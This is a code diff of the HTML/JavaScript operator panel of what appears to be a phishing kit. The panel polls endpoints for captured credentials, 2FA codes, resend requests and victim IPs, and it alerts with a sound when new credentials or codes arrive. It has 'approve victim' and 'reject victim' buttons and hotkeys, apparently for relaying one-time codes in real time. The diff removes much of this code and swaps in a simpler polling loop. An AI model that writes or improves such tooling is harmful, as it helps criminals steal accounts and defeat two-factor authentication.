-            const rate = document.getElementById('refreshRate').value;
-            if (refreshInterval) clearInterval(refreshInterval);
-            refreshInterval = setInterval(async () => {
-                const credsBefore = lastCredCount;
-                const codesBefore = last2faCount;
-                const [credsRes, codesRes, resendRes, stateRes, ipsRes] = await Promise.all([
-                    fetch('/api/get-creds'), fetch('/api/get-2fa'), fetch('/api/get-resend-requests'), fetch('/api/get-state'), fetch('/api/get-ips')
-                ]);
-                const creds = await credsRes.json();
-                const codes = await codesRes.json();
-                const resends = await resendRes.json();
-                const state = await stateRes.json();
-                const ips = await ipsRes.json();
-                if (creds.length > credsBefore) playNotification();
-                if (codes.length > codesBefore) playNotification();
-                lastCredCount = creds.length;
-                last2faCount = codes.length;
-                renderAll(creds, codes, resends, state, ips);
-                document.getElementById('connectionStatus').classList.add('connected');
-            }, parseInt(rate));
-        }
-        
-        document.getElementById('connectionStatus').classList.add('connected');
-        
-        setTimeout(() => {
-            document.getElementById('connectionStatus').classList.add('connected');
-        }, 1000);
-        
-        updateRefreshRate();
-        
-        if (localStorage.getItem('theme') === 'light') {
-            document.body.classList.add('light-mode');
-            document.querySelector('.theme-toggle').textContent = '☀️';
-        }
-        
-        document.addEventListener('keydown', (e) => {
-            if (e.target.tagName === 'INPUT') return;
-            if (e.key === 'a' || e.key === 'A') approveVictim();
-            if (e.key === 'r' || e.key === 'R') rejectVictim();
-        });
-    function toggleSection(id) {
-            const section = document.getElementById(id);
-            if (section.style.display === 'none') {
-                section.style.display = '';
-            } else {
-                section.style.display = 'none';
-            }
-        }
-        
-        function addEmptyStateIcons() {
-            document.querySelectorAll('.empty-state').forEach(el => {
-                if (!el.querySelector('.empty-icon')) {
-                    el.innerHTML = '<div class="empty-icon">📭</div>' + el.innerHTML;
-                }
-            });
-        }
-        
-        setInterval(addEmptyStateIcons, 500);
-        
-        let approved = 0, rejected = 0;
-        
-        function updatePieChart() {
-            const container = document.getElementById('pie-chart');
-            if (!container) return;
-            const total = approved + rejected || 1;
-            const pct = (approved / total) * 100;
-            container.innerHTML = `<div style="width:100px;height:100px;border-radius:50%;background:conic-gradient(var(--accent-green) ${pct}%, var(--accent-red) ${pct}%);display:flex;align-items:center;justify-content:center;font-weight:bold;color:#fff;">${approved + rejected}</div>`;
-        }
-        
-        document.addEventListener('keydown', (e) => {
-            if (e.target.tagName === 'INPUT') return;
-            if (e.key === 'a' || e.key === 'A') { approveVictim(); playNotification(); }
-            if (e.key === 'r' || e.key === 'R') { rejectVictim(); }
-        });
-        
+        loadData();
+        setInterval(loadData, 2000);
     </script>
-<div class="quick-toolbar">
-        <button class="btn btn-approve" onclick="approveVictim()">✅ Approve</button>
-        <button class="btn btn-reject" onclick="rejectVictim()">❌ Reject</button>
-    </div>
 </body>
 </html>
